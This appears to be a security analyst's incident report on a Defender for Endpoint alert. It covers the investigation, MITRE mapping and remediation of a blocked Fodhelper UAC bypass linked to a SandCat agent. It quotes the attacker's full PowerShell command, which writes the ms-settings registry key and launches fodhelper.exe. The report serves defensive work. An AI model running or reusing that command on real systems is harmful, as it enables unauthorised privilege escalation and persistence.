**Alert:** Anomaly detected in ASEP registry

**Endpoint:** ec2amaz-9oh9aqq

**User:** NT AUTHORITY\SYSTEM

**OS:** WindowsServer2022

**Verdict:** True positive

<img width="617" height="447" alt="image" src="https://github.com/user-attachments/assets/749b2edd-5db7-44b1-af26-f4aff0e875ba" />



## Command Line:

## Some of command are:

powershell.exe -ExecutionPolicy Bypass -C "New-Item 'HKCU:\Software\Classes\ms- settings\Shell\Open\command' -Force | Out-Null; Set-ItemProperty 'HKCU:\Software\Classes\ms- settings\Shell\Open\command' '(Default)' \"cmd /c **whoami** /all > \$env:TEMP\svc_ident.dat\"; New- ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' DelegateExecute '' -Force | Out-Null; Start-Process fodhelper.exe -WindowStyle Hidden"

New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force | Out-Null; Set- ItemProperty 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' '(Default)' "cmd /c whoami /all > \$env:TEMP\svc_ident.dat"; New-ItemProperty 'HKCU:\Software\Classes\ms- settings\Shell\Open\command' DelegateExecute '' -Force | Out-Null; Start-Process **fodhelper.exe** - WindowStyle Hidden


## Why was the alert triggered?

A process registered a suspicious command or file in ASEP registry key, where it will be run after a reboot. An attacker may place a malicious piece of software in such a location to prevent losing access if a machine is turned off.

## Investigation Summary

Microsoft Defender for Endpoint generated a high-severity alert for Anomaly detected in ASEP registry on ec2amaz-9oh9aqq. 

Investigation identified powershell.exe executing with execution Policy Bypass to modify the registry key: **HKCU\Software\Classes\ms-settings\Shell\Open\command**

Created the DelegateExecute value and launch **fodhelper.exe**.
  

This sequence is consistent with the **Fodhelper UAC bypass** technique used to escalate privileges.

The activity originated from the suspicious executable C:\Users\Public\wusvc.exe, which communicated with 172.31.2.203:8888 and was detected by Microsoft Defender as Trojan:Win64/SandCat!rfn. 

Defender also detected Behavior:Win32/UACBypassExp.T!gen and successfully blocked and remediated the malicious behaviour. 

The alert is assessed as a True Positive indicating attempted Privilege Escalation, Persistence, and Defense Evasion.

## MITRE ATT&CK:

- T1548.002 ‑ Bypass User Account Control

- T1112 ‑ Modify Registry

- T1547 — Boot or Logon Autostart Execution (ASEP)

- T1059.001 ‐ PowerShell

## Remediation

- Isolated the affected endpoint from the network.

- Removed C:\Users\Public\wusvc.exe

- Deleted the malicious registry keys (HKCU\Software\Classes\ms- settings\Shell\Open\command and DelegateExecute)

- Conducted a full antivirus scan of the endpoint.

- Investigated 172.31.2.203:8888 connections, file hashes, filenames (wusvc.exe), registry modifications, similar PowerShell command lines and isolated the affected hosts.

- Continued monitoring for any recurrence of UAC bypass or related malicious activity.
